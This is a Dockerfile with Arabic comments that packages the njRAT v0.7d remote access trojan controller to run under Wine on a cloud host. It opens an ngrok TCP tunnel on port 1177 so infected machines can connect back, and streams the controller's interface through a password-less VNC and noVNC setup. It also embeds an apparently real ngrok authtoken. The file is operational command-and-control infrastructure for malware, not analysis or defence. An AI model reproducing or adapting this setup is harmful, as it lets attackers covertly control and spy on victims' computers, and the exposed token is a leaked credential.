FROM ubuntu:22.04

# منع التفاعل أثناء التثبيت لضمان عدم توقف البناء سحابياً
ENV DEBIAN_FRONTEND=noninteractive

# تثبيت التحديثات وحزم الواجهة الرسومية وخادم noVNC وبيئة تشغيل تطبيقات ويندوز/الـ .NET
RUN apt-get update && apt-get install -y \
    xvfb \
    x11vnc \
    novnc \
    websockify \
    fluxbox \
    wine64 \
    mono-complete \
    curl \
    && rm -rf /var/lib/apt/lists/*

# تحميل وتثبيت أداة Ngrok الرسمية داخل النظام
RUN curl -s https://bin.equinox.io/c/bNyj1mQcaGS/ngrok-stable-linux-amd64.tgz | tar xz -C /usr/local/bin

WORKDIR /app

# نسخ جميع ملفات المشروع (بما فيها ملف الـ .exe) من المستودع إلى الحاوية
COPY . /app

# Render يفرض فتح منفذ للويب، المنفذ الافتراضي للخطة المجانية هو 10000
EXPOSE 10000

# كتابة سكريبت الإقلاع لتشغيل النظام الرسومي والنفق والبرنامج معاً عند بدء السيرفر
RUN echo '#!/bin/bash\n\
# 1. تشغيل خادم العرض الافتراضي في الخلفية لتوليد واجهة رسومية\n\
Xvfb :1 -screen 0 1024x768x16 &\n\
export DISPLAY=:1\n\
fluxbox &\n\
x11vnc -forever -shared -bg -nopw -display :1 &\n\
\n\
# 2. ربط حساب Ngrok بالرمز الخاص بك وتشغيل نفق الـ TCP على منفذ 1177\n\
ngrok config add-authtoken Cr_3GGdkvG7pObxEzyudWvsReOI1J4\n\
ngrok tcp 1177 &\n\
\n\
# 3. تشغيل برنامج الـ .NET باستخدام محاكي Wine في الخلفية\n\
# (تأكد من تغيير اسم الملف "YourProgram.exe" للاسم الحقيقي لملفك في GitHub)\n\
wine /app/njRAT v0.7d.exe &\n\
\n\
# 4. تشغيل خادم noVNC لبث واجهة البرنامج الرسومية على متصفحك عبر منفذ Render\n\
/usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 10000\n\
' > /app/start.sh && chmod +x /app/start.sh

CMD ["/app/start.sh"]
